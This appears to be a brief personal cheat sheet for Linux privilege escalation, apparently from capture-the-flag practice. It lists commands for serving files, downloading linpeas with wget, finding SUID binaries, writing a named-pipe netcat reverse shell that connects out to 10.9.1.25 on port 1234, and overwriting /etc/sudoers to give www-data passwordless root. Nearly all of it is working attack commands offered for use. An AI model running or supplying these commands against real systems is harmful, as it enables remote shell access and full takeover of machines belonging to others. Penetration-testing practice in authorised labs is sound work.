#simple python server to transfer our file :
python -m SimpleHTTPServer 8090

#Linpeas
wget ip/linpeas/linpeas.sh


#get out of the blue program :
find / -perm -u=s -type f 2>/dev/null

and try to find the loophole, program that may have root permission on running it.


## Simple privescalation :
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.1.25 1234 >/tmp/f" > shell.sh
echo "www-data ALL=(root) NOPASSWD: ALL" > /etc/sudoers